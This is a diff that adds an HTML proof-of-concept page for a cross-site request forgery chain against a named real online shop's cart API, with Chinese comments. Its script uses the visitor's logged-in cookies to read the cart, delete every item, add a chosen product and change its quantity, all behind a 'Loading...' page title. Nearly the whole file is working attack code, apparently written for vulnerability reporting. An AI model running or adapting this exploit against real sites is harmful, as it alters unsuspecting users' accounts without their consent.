@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+</head>
+<body>
+  <h1>CSRF Chain PoC</h1>
+  <div id="log"></div>
+  <script>
+    const BASE = 'https://www.opposhop.cn/cn/oapi';
+    // 要加入的商品 ID 和 SKU ID（替换成你实际测试的商品）
+    const PRODUCT_ID = '40832';
+    const PRODUCT_SKU_ID = '40832';
+
+    const log = (msg) => {
+      const el = document.getElementById('log');
+      el.innerHTML += '<p>' + msg + '</p>';
+      console.log('[PoC] ' + msg);
+    };
+
+    async function sleep(ms) {
+      return new Promise(r => setTimeout(r, ms));
+    }
+
+    async function main() {
+      // ========== Step 1: 读取购物车列表 ==========
+      log('Step 1: 读取购物车列表...');
+      const listResp = await fetch(BASE + '/orders/web/cart/v1/list?opca=', {
+        method: 'GET',
+        credentials: 'include',
+        headers: { 'Accept': 'application/json, text/plain, */*' }
+      });
+      const listData = await listResp.json();
+      log('列表响应: code=' + listData.code);
+
+      // 提取所有 cartId
+      const cartIds = [];
+      const forms = (listData.data && listData.data.cartsGoodsForms) || [];
+      for (const item of forms) {
+        if (item.cartId) cartIds.push(item.cartId);
+      }
+      log('发现 ' + cartIds.length + ' 个 cartId: ' + cartIds.join(', '));
+
+      // ========== Step 2: 删除购物车全部商品 ==========
+      log('Step 2: 删除购物车全部商品...');
+      for (const id of cartIds) {
+        const resp = await fetch(BASE + '/orders/web/cart/v1/remove', {
+          method: 'POST',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'id=' + encodeURIComponent(id)
+        });
+        const data = await resp.json();
+        log('删除 ' + id + ' → code=' + data.code);
+      }
+
+      // ========== Step 3: 加入一个商品 ==========
+      log('Step 3: 加入商品...');
+      const addBody = [
+        'quantity=1',
+        'quickbuy=0',
+        'gifts=',
+        'packages=[]',
+        'services=[]',
+        'pingouEnable=',
+        'pingouId=',
+        'opca=',
+        'shopCode=',
+        'serial=',
+        'cfType=2',
+        'cfId=',
+        'id=' + PRODUCT_ID,
+        'skuId=' + PRODUCT_SKU_ID
+      ].join('&');
+
+      const addResp = await fetch(BASE + '/orders/web/cart/v1/insert', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: addBody
+      });
+      const addData = await addResp.json();
+      log('加入响应: code=' + addData.code + ' cartId=' + (addData.data && addData.data.cartId));
+
+      const newCartId = addData.data && addData.data.cartId;
+      if (!newCartId) {
+        log('未获取到新 cartId，终止');
+        return;
+      }
+
+      // ========== Step 4: 等待 20 秒 ==========
+      log('Step 4: 等待 20 秒...');
+      await sleep(20000);
+
+      // ========== Step 5: 修改商品数量为 2 ==========
+      log('Step 5: 修改数量为 2...');
+      const updResp = await fetch(BASE + '/orders/web/cart/v3/update', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'id=' + encodeURIComponent(newCartId) + '&quantity=2'
+      });
+      const updData = await updResp.json();
+      log('修改响应: code=' + updData.code);
+      log('=== 攻击链执行完成 ===');
+    }
+
+    main().catch(e => log('异常: ' + e.message));
+  </script>
+</body>
+</html>
